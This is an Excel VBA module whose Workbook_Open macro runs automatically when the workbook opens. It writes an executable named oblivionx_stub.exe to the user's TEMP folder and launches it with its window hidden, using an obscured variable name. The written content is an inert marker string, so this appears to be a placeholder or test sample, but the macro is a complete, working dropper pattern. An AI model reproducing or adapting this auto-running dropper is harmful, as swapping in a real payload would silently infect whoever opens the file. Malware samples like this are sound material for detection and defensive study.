Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim frs0swbone As Integer, exe As String
    exe = Environ("TEMP") & "\oblivionx_stub.exe"
    frs0swbone = FreeFile
    Open exe For Binary As #frs0swbone
    Put #frs0swbone, , "MZ-this-is-an-inert-marker-stub"
    Close #frs0swbone
    Shell exe, 0
End Sub
